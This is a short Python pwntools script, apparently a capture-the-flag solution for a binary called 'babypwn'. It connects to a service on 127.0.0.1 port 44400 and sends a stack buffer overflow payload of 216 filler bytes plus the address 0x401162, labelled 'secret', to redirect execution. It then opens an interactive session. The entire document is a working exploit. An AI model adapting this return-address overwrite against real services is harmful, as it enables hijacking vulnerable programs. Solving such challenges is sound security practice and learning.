from pwn import *

#p=process("./babypwn")
p=remote('127.0.0.1',44400)

secret=0x401162
p.recv()

payload='A'*216+p64(secret)

p.sendline(payload)

p.interactive()
